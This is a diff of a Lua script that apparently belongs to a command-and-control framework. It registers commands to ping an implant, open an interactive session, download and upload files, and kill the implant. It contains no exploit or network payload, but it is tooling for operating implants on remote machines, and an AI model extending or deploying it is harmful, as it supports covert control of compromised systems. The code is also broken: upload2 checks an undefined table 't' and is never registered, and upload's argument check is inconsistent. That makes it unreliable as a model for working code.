@@ -1,6 +1,9 @@
 CODE = {
     PING = 1,
-    SSH = 2
+    SSH = 2,
+    DOWN = 3,
+    UPL = 4,
+    KILL = 5
 }
 
 function ping(payload)
@@ -19,10 +22,66 @@ function ssh(payload)
     end
 end
 
+function download(payload)
+    print("command download from script with args", payload)
+    local err = addtask(CODE.DOWN, payload)
+    if err then
+        print("Error")
+    end
+end
+
+function upload(payload)
+    local c = 0
+    local lcs = {}
+    for token in string.gmatch(payload, "[^%s]+") do 
+        lcs[c] = token
+        c=c+1
+    end
+    if #lcs ~= 1 then
+        print("problem")
+        return
+    end
+
+    local err = addtaskuploadfile(CODE.UPL, lcs[0], lcs[1])
+    if err then
+        print("Error")
+    end
+end
+
+function upload2(payload)
+    opts = {}
+    -- = "s=/tmp/image.png d=Lua"
+    for k, v in string.gmatch(payload, "(%w+)=([%w/.]+)") do
+        opts[k] = v
+    end
+
+    if not t.s or not t.d then
+        print("problem")
+        return
+    end
+
+    local err = addtaskuploadfile(CODE.UPL, opts.s, opts.d)
+    if err then
+        print("Error")
+    end
+end
+
+function kill(payload)
+    print("command kill from script with args", payload)
+    local err = addtask(CODE.KILL, payload)
+    if err then
+        print("Error")
+    end
+end
+
 -- impl, name, desc, func
 command("impl","ping","Ping the implant", ping)
 command("impl","ssh","Get an interactive session", ssh)
+command("impl","download","Download a file", download)
+command("impl","upload","upload a file", upload)
+command("impl","kill","Kill implant", kill)
 
+--[[
 function OnRegister(...)
     local args = {...}
     print("Name:", args[1])
@@ -51,6 +110,7 @@ function OnResponse(...)
     print("response:", args[5])
     print("task:", args[6])
 end
+]]
 
 function Main()
 end
